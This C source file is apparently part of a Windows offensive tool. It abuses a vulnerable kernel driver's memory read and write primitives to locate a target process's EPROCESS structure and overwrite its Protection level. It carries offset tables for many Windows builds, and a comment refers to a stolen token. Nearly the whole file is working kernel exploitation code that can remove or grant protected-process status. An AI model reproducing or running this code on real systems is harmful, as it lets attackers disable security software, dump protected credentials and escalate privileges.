#include "common.h"

#include <psapi.h> // Required for EnumDrivers

void PrintOffsets() {
    info_t("EPROCESS Offsets:");
    info_t("\tdwUniqueProcessId: \t\t0x%llx", g_Offsets.UniqueProcessIdOffset);
    info_t("\tActiveProcessLinks: \t\t0x%llx", g_Offsets.ActiveProcessLinksOffset);
    info_t("\tProtection: \t\t\t0x%llx", g_Offsets.ProtectionOffset);
}

BOOL GetOffsets() {

    BOOL	bSTATE = TRUE;
    HMODULE	hNTDLL = NULL;      // Stores handle to ntdll.dll

    // Declare the RTL_OSVERSIONINFOW structure
    RTL_OSVERSIONINFOW versionInfo = { 0 };
    versionInfo.dwOSVersionInfoSize = sizeof(RTL_OSVERSIONINFOW);

    // Get handle to ntdll.dll
    // https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya
    hNTDLL = LoadLibraryA("ntdll.dll");
    if (!hNTDLL) {
        errorWin32("LoadLibraryA - Failed to get handle to ntdll.dll");
        bSTATE = FALSE;
        goto _cleanUp;
    }
    info_t("LoadLibraryA - Received handle to ntdll.dll 0x%p", hNTDLL);

    // Resolve address of RtlGetVersion
    fnRtlGetVersion pRtlGetVersion = (fnRtlGetVersion)GetProcAddress(hNTDLL, "RtlGetVersion");
    if (!pRtlGetVersion) {
        errorWin32("GetProcAddress - Failed to address of RtlGetVersion");
        bSTATE = FALSE;
        goto _cleanUp;
    }
    info_t("GetProcAddress - Received address to RtlGetVersion 0x%p", pRtlGetVersion);

    // Call RtlGetVersion to get the Windows version
    if (pRtlGetVersion(&versionInfo) == 0) {
        info_t("Windows Version: %lu.%lu (Build: %lu)\n", versionInfo.dwMajorVersion, versionInfo.dwMinorVersion, versionInfo.dwBuildNumber);
    }
    else {
        error("Failed to get Windows version.\n");
        return FALSE;
    }

    // Get the offsets for UniqueProcessIdOffset and ActiveProcessLinksOffset
    if (versionInfo.dwBuildNumber == 3790) {
        g_Offsets.UniqueProcessIdOffset = 0xd8;
        g_Offsets.ActiveProcessLinksOffset = 0xe0;
    }
    else if (versionInfo.dwBuildNumber == 6000 || versionInfo.dwBuildNumber == 6001 || versionInfo.dwBuildNumber == 6002) {
        g_Offsets.UniqueProcessIdOffset = 0xe0;
        g_Offsets.ActiveProcessLinksOffset = 0xe8;
    }
    else if (versionInfo.dwBuildNumber == 7600 || versionInfo.dwBuildNumber == 7601) {
        g_Offsets.UniqueProcessIdOffset = 0x180;
        g_Offsets.ActiveProcessLinksOffset = 0x188;
    }
    else if (versionInfo.dwBuildNumber == 9200) {
        g_Offsets.UniqueProcessIdOffset = 0x2e0;
        g_Offsets.ActiveProcessLinksOffset = 0x2e8;
    }
    else if (versionInfo.dwBuildNumber >= 9200 && versionInfo.dwBuildNumber <= 9600) {
        g_Offsets.UniqueProcessIdOffset = 0x2e0;
        g_Offsets.ActiveProcessLinksOffset = 0x2e8;
    }
    else if (versionInfo.dwBuildNumber >= 10240 && versionInfo.dwBuildNumber <= 14393) {
        g_Offsets.UniqueProcessIdOffset = 0x2e8;
        g_Offsets.ActiveProcessLinksOffset = 0x2f0;
    }
    else if (versionInfo.dwBuildNumber >= 15063 && versionInfo.dwBuildNumber <= 17763) {
        g_Offsets.UniqueProcessIdOffset = 0x2e0;
        g_Offsets.ActiveProcessLinksOffset = 0x2e8;
    }
    else if (versionInfo.dwBuildNumber == 18362) {
        g_Offsets.UniqueProcessIdOffset = 0x2e8;
        g_Offsets.ActiveProcessLinksOffset = 0x2f0;
    }
    else if (versionInfo.dwBuildNumber >= 19041 && versionInfo.dwBuildNumber <= 22631) {
        g_Offsets.UniqueProcessIdOffset = 0x440;
        g_Offsets.ActiveProcessLinksOffset = 0x448;
    }
    else if (versionInfo.dwBuildNumber >= 26100) {
        g_Offsets.UniqueProcessIdOffset = 0x1d0;
        g_Offsets.ActiveProcessLinksOffset = 0x1d8;
    }
    else {
        g_Offsets.UniqueProcessIdOffset = 0x0;
        g_Offsets.ActiveProcessLinksOffset = 0x0;
        return FALSE;
    }

    // Get the offsets for the Protection level
    if (versionInfo.dwBuildNumber == 9600) {
        g_Offsets.ProtectionOffset = 0x67a;
    }
    else if (versionInfo.dwBuildNumber == 10240) {
        g_Offsets.ProtectionOffset = 0x6aa;
    }
    else if (versionInfo.dwBuildNumber == 10586) {
        g_Offsets.ProtectionOffset = 0x6b2;
    }
    else if (versionInfo.dwBuildNumber == 14393) {
        g_Offsets.ProtectionOffset = 0x6c2;
    }
    else if (versionInfo.dwBuildNumber == 15063) {
        g_Offsets.ProtectionOffset = 0x6ca;
    }
    else if (versionInfo.dwBuildNumber == 16299) {
        g_Offsets.ProtectionOffset = 0x6ca;
    }
    else if (versionInfo.dwBuildNumber == 17134) {
        g_Offsets.ProtectionOffset = 0x6ca;
    }
    else if (versionInfo.dwBuildNumber == 17763) {
        g_Offsets.ProtectionOffset = 0x6ca;
    }
    else if (versionInfo.dwBuildNumber == 18362) {
        g_Offsets.ProtectionOffset = 0x6fa;
    }
    else if (versionInfo.dwBuildNumber >= 19041 && versionInfo.dwBuildNumber <= 22631) {
        g_Offsets.ProtectionOffset = 0x87a;
    }
    else if (versionInfo.dwBuildNumber >= 26100) {
        g_Offsets.ProtectionOffset = 0x5fa;
    }
    else {
        g_Offsets.ProtectionOffset = 0x0;
        return bSTATE;
    }

_cleanUp:

    // Cleanup close handle
    if (hNTDLL) {
        FreeLibrary(hNTDLL);
    }

    return bSTATE;

}

DWORD64 GetKernelBaseAddr() {
    
    DWORD dwCB = 0;
    DWORD64 dwDrivers[1024];

    // Retrieve the load address for each device driver in the system
    // https://learn.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-enumdevicedrivers
    if (EnumDeviceDrivers(dwDrivers, sizeof(dwDrivers), &dwCB)) {
        
        // Return the first address in the list, which should be the address of Ntoskrnl
        return (DWORD64)dwDrivers[0];
    }
    return NULL;
}

DWORD64 ResolvePsInitialSystemProcessOffset() {

    HMODULE     hNtoskrnl                       = NULL; // Stores handle to ntoskrnl.exe
    DWORD64     PsInitialSystemProcessOffset    = NULL; // Stores the PsInitialSystemProcessOffset offset

    // Get handle to ntoskrnl.exe
    // https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya
    hNtoskrnl = LoadLibraryA("ntoskrnl.exe");
    if (!hNtoskrnl) {
        errorWin32("LoadLibraryA - Failed to get handle to ntoskrnl.exe");
        return NULL;
    }
    info_t("LoadLibraryA - Received handle to ntoskrnl.exe 0x%p", hNtoskrnl);

    // Resolve offset of PsInitialSystemProcessOffset
    PsInitialSystemProcessOffset = (DWORD64)GetProcAddress(hNtoskrnl, "PsInitialSystemProcess") - (DWORD64)hNtoskrnl;
    if (!PsInitialSystemProcessOffset) {
        errorWin32("GetProcAddress - Failed to resolv PsInitialSystemProcess offset");
        if (hNtoskrnl) {
            FreeLibrary(hNtoskrnl);
        }
        return NULL;
    }

    // Cleanup free library
    if (hNtoskrnl) {
        FreeLibrary(hNtoskrnl);
    }

    return PsInitialSystemProcessOffset;

}

BOOL ChangeProtectionLevel(IN DWORD64 dwPID, DWORD dwProtectionLevel) {

    BOOL        bSTATE                          = TRUE;
    HANDLE		hDevice                         = NULL; // Stores handle to the device driver
    DWORD64     dwKernelBase                    = NULL; // Stores kernel base address
    DWORD64     PsInitialSystemProcessOffset    = NULL; // Stores the PsInitialSystemProcess offset
    DWORD64     PsInitialSystemProcessAddress   = NULL; // Stores the address to PsInitialSystemProcess
    DWORD64     dwTargetProcessAddress          = NULL; // Stores the target process address where the stolen token will be overwritten
    DWORD64     dwListHead                      = NULL; // Stores the first node in the kernel process list
    DWORD64     dwCurrentListEntry              = NULL; // Stores the current list entry currently enumerating
    DWORD64     dwProcessEntry                  = NULL; // Stores the start of the current process _EPROCESS
    DWORD64     dwUniqueProcessId               = NULL; // Stores the current PID currently enumerating

    // Open a handle to the vulnerable driver using symbolik link
    hDevice = GetDeviceHandle(g_VULNDRIVERSYMLINK);
    if (hDevice == NULL) {
        error("GetDeviceHandle - Failed");
        bSTATE = FALSE;
        goto _cleanUp;
    }
    info_t("GetDeviceHandle - Handle to vulnerable driver 0x%p", hDevice);
    
    // Get Ntoskrnl base address
    dwKernelBase = GetKernelBaseAddr();
    if (dwKernelBase == NULL) {
        error("GetKernelBaseAddr - Failed to get Ntoskrnl address");
        return NULL;
    }
    info_t("GetKernelBaseAddr - Ntoskrnl base address: 0x%p", dwKernelBase)

    // Resolve offset of PsInitialSystemProcessOffset
    PsInitialSystemProcessOffset = ResolvePsInitialSystemProcessOffset();
    if (!PsInitialSystemProcessOffset) {
        errorWin32("ResolvePsInitialSystemProcessOffset - Failed to resolv PsInitialSystemProcess offset");
        bSTATE = FALSE;
        goto _cleanUp;
    }
    info_t("ResolvePsInitialSystemProcessOffset - PsInitialSystemProcess offset 0x%p", PsInitialSystemProcessOffset);

    // Resolve the address of PsInitialSystemProcess in kernel memory
    PsInitialSystemProcessAddress = ReadMemoryDWORD64(hDevice, dwKernelBase + PsInitialSystemProcessOffset);
    if (!PsInitialSystemProcessAddress) {
        error("ReadMemoryDWORD64 - failed");
        bSTATE = FALSE;
        goto _cleanUp;
    }
    info_t("ReadMemoryDWORD64 - PsInitialSystemProcessAddress: 0x%p", PsInitialSystemProcessAddress);


    // Get the address of the first node in the list
    dwListHead = PsInitialSystemProcessAddress + g_Offsets.ActiveProcessLinksOffset;

    // Start from the beginning of the list
    dwCurrentListEntry = dwListHead;
    do
    {
        // Subtract the ofset to get the start of the current process _EPROCESS
        dwProcessEntry = dwCurrentListEntry - g_Offsets.ActiveProcessLinksOffset;

        // Read PID of the process in the _EPROCESS struct
        dwUniqueProcessId = ReadMemoryDWORD64(hDevice, dwProcessEntry + g_Offsets.UniqueProcessIdOffset);

        // Check if the PID equals our target pid
        if (dwUniqueProcessId == dwPID)
        {
            dwTargetProcessAddress = dwProcessEntry;
            break;
        }

        // Follow the Flink pointer to the next process in the list
        dwCurrentListEntry = ReadMemoryDWORD64(hDevice, dwProcessEntry + g_Offsets.ActiveProcessLinksOffset);
    } while (dwCurrentListEntry != dwListHead);

    if (!dwTargetProcessAddress) {
        error("ReadMemoryDWORD64 - Failed to resolve target process address");
        bSTATE = FALSE;
        goto _cleanUp;
    }
    info_t("ReadMemoryDWORD64 - Target process address: 0x%p", dwTargetProcessAddress);
    
    // Change the process's protection level
    info_t("WriteMemoryPrimitive - Changing protection level to 0x%02X", dwProtectionLevel);
    if (!WriteMemoryPrimitive(hDevice, 4, dwTargetProcessAddress + g_Offsets.ProtectionOffset, dwProtectionLevel)) {
        error("WriteMemoryPrimitive - Failed to set protection level");
        bSTATE = FALSE;
        goto _cleanUp;
    }

_cleanUp:

    // Close handle to device
    if (hDevice) {
        CloseHandle(hDevice);
    }

    return bSTATE;

}